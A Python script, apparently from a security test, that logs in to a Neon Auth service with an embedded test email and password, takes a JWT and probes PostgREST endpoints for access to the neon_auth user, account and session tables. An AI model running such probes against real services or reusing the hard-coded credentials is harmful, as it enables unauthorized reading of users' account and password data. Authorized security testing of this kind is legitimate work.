# -*- coding: utf-8 -*-
"""V7a: Data API - can authenticated JWT read neon_auth schema tables?
If yes: any signed-up user can read user/session/account (password hashes) tables.
Prior tests only probed public schema (404); neon_auth schema exposure untested."""
import json, ssl, time, http.client, base64

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
AP = "ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build"
DB = "neondb"
ctx = ssl.create_default_context()


def req(host, method, path, body=None, hdr=None, timeout=25):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=timeout)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json'}
        if hdr:
            h.update(hdr)
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}


def b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.b64encode(s).decode().replace('+', '-').replace('/', '_').rstrip('=')


def dec(s):
    s2 = s.replace('-', '+').replace('_', '/')
    s2 += '=' * (-len(s2) % 4)
    return base64.b64decode(s2).decode('utf-8', 'replace')


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def main():
    out("== V7a Data API neon_auth schema exposure ==")
    # login as existing verified-ish user (na2)
    st, raw, hdrs1 = req(NA_HOST, 'POST', '/%s/auth/sign-in/email' % DB,
                         {'email': 'libobo1229+na2@gmail.com', 'password': 'SecTest!2026pass2'},
                         {'Origin': 'http://localhost:3000'})
    out("sign-in na2: %d %s" % (st, raw[:120]))
    sc = hdrs1.get('set-cookie') or ''
    cookies = {}
    for part in sc.split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            cookies[k.strip()] = v.strip()
    ck = '; '.join('%s=%s' % (k, v) for k, v in cookies.items())
    jwt = ''
    if ck:
        st2, raw2, _ = req(NA_HOST, 'GET', '/%s/auth/token' % DB, hdr={'Cookie': ck})
        if st2 == 200:
            jwt = json.loads(raw2).get('token', '')
    if not jwt:
        out("NO JWT abort")
        return
    out("jwt ok len=%d" % len(jwt))

    # probe neon_auth tables via PostgREST (real JWT)
    probes = [
        ("/neondb/rest/v1/user", "user (unqualified)"),
        ("/neondb/rest/v1/neon_auth.user", "neon_auth.user qualified"),
        ("/neondb/rest/v1/account", "account"),
        ("/neondb/rest/v1/neon_auth.account", "neon_auth.account"),
        ("/neondb/rest/v1/session", "session"),
        ("/neondb/rest/v1/neon_auth.session", "neon_auth.session"),
        ("/neondb/rest/v1/neon_auth.member", "neon_auth.member"),
        ("/neondb/rest/v1/neon_auth.invitation", "neon_auth.invitation"),
        ("/neondb/rest/v1/neon_auth.organization", "neon_auth.organization"),
        ("/neondb/rest/v1/neon_auth.verification", "neon_auth.verification"),
        ("/neondb/rest/v1/neon_auth.user?select=email,id&limit=3", "user select limited"),
        ("/neondb/rest/v1/public.todos", "public.todos ctrl"),
    ]
    for p, tag in probes:
        st3, raw3, hd3 = req(AP, 'GET', p, hdr={'Authorization': 'Bearer ' + jwt})
        out("%-42s -> %d %s" % (tag, st3, raw3[:220].replace('\n', ' ')))
        time.sleep(0.4)

    # rpc / function exposure on neon_auth? and root with Accept-Profile
    st4, raw4, hd4 = req(AP, 'GET', '/neondb/rest/v1/',
                         hdr={'Authorization': 'Bearer ' + jwt,
                              'Accept-Profile': 'neon_auth'})
    out("root w/ Accept-Profile neon_auth -> %d %s" % (st4, raw4[:200]))


if __name__ == "__main__":
    main()
